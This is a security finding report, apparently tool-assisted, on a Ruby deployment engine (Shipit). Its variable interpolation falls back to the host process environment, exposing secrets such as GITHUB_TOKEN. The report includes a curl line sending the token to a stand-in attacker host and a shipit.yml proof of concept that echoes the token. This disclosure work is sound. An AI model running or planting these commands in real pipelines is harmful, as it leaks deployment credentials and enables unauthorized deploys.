### Title
Command argument interpolation falls back to the Shipit host's raw process environment, letting shipit.yml steps exfiltrate host secrets - (File: lib/shipit/environment_variables.rb)

### Summary
`EnvironmentVariables#interpolate`, used by every `Shipit::Command` invocation (deploy, rollback, task and review-check steps), resolves any `$VARIABLE` reference in a `shipit.yml`-defined command line against the task/step's *whitelisted* env hash, but silently falls back to the Shipit server's own `ENV` when the name isn't in that whitelist. This breaks the binding between "environment keys a stack/task is permitted to reference" and "environment keys actually spawned into the command," letting a `shipit.yml` step reference any variable present in the Shipit host process (e.g. `GITHUB_TOKEN`, database credentials, Rails secrets) even though that variable was never declared or approved for the stack.

### Finding Description
`EnvironmentVariables.permit` enforces a strict whitelist and raises `NotPermitted` for any undeclared key [1](#0-0) . This whitelist is what the API (`TasksController#trigger`, deploy creation, etc.) and `Stack#trigger_task` / `Stack#build_deploy` rely on to keep task/deploy `env` inputs constrained to declared `variables` [2](#0-1) .

However, a *different* code path, `EnvironmentVariables#interpolate`, is used to expand `$VAR` references embedded directly in the shell command strings that `shipit.yml` defines (`deploy.override`, `review.checks`, task `steps`, etc.):

```
def interpolate(argument)
  return argument unless @env
  argument.gsub(/(\$\w+)/) do |variable|
    variable.sub!('$', '')
    Shellwords.escape(@env.fetch(variable) { ENV[variable] })
  end
end
``` [3](#0-2) 

This is invoked from `Command#interpolate_environment_variables`, which feeds directly into `interpolated_arguments`, the exact argv used to `PTY.spawn` the process on the Shipit host: [4](#0-3) [5](#0-4) 

Unlike `permit`, `interpolate`'s fallback (`ENV[variable]`) is unconstrained: if the referenced name is not present in the filtered per-task/step `@env`, it is looked up in the real OS environment of the Shipit application process — the same process that holds the app's `GITHUB_TOKEN`, database URL, Rails `secret_key_base`, and any other secrets configured for the deploy host.

This is reachable from `review.checks`, which are executed on arbitrary, unmerged commits via `EphemeralCommitChecks#run` (used for pre-deploy/PR review, prior to any merge or CI gating), using `Command.new(c, env: Shipit.env, chdir:)` [6](#0-5) . Since `review.checks` command strings come straight from the repository's `shipit.yml` at that commit (`deploy_spec.review_checks`), and `Shipit.env` is a small, fixed hash unrelated to host secrets, any `$VARNAME` in a review-check command line that is not one of the few keys in `Shipit.env` will fall through to the host's `ENV[VARNAME]`.

The equality that should hold is:
`{env keys permitted for a stack/task} == {env keys reachable by $VAR interpolation in that stack's shipit.yml steps}`

Instead, the right-hand side effectively equals the full Shipit host process environment, because of the unguarded `ENV[variable]` fallback in `interpolate`.

### Impact Explanation
This allows exfiltration of secrets belonging to the Shipit application host — most notably `GITHUB_TOKEN`/GitHub App credentials, database credentials, and Rails secrets — directly into command output or to an attacker-controlled endpoint (e.g. `curl https://evil.example/?t=$GITHUB_TOKEN`), which is explicitly listed as a Critical-severity impact (exfiltration of `GITHUB_TOKEN`). It also can lead to unauthorized deploys/rollbacks if the leaked GitHub token is used to push directly or bypass review.

### Likelihood Explanation
Any contributor able to modify `shipit.yml` in a branch/PR that gets evaluated by review checks or task/deploy steps can trigger this — no Shipit session, ApiClient token, or privileged account is required; the vulnerable code path is purely in the engine's own command construction/interpolation logic (`lib/shipit/environment_variables.rb`, `lib/shipit/command.rb`), not dependent on any deployment misconfiguration.

### Recommendation
Remove the `ENV[variable]` fallback from `EnvironmentVariables#interpolate` (or restrict it to an explicit, documented allowlist identical to the one used by `permit`). Command-line `$VAR` interpolation should only ever resolve against the same whitelisted `env` hash that `permit` already enforces, never against the raw host process environment.

### Proof of Concept
1. In a tracked repository, submit a commit (e.g. via PR) with a `shipit.yml` containing:
```yaml
review:
  checks:
    - "echo $GITHUB_TOKEN"
```
2. Shipit runs `EphemeralCommitChecks#run` for that commit, building `Command.new("echo $GITHUB_TOKEN", env: Shipit.env, chdir:)`.
3. `$GITHUB_TOKEN` is not present in `Shipit.env`, so `EnvironmentVariables#interpolate` falls back to `ENV['GITHUB_TOKEN']` — the Shipit application's actual GitHub token.
4. The interpolated command `echo <real-token-value>` is spawned via `PTY.spawn`, and its output is captured into the review-check output stream, visible to the PR author.

**Uncertainty**: I could not fully trace, within the available index, the exact webhook/handler path that determines whether `review.checks` execute for commits pushed by non-collaborators from a fork PR versus only for commits on the tracked repository itself (branch protection/collaborator requirements are enforced upstream in some Shipit deployments). This affects whether the attacker needs push access to the tracked repo or can merely open a PR from a fork. The root-cause code (unsafe `ENV` fallback in interpolation) is confirmed directly from the source, but confirming the least-privileged trigger path would benefit from a full-repository review via a Devin session.
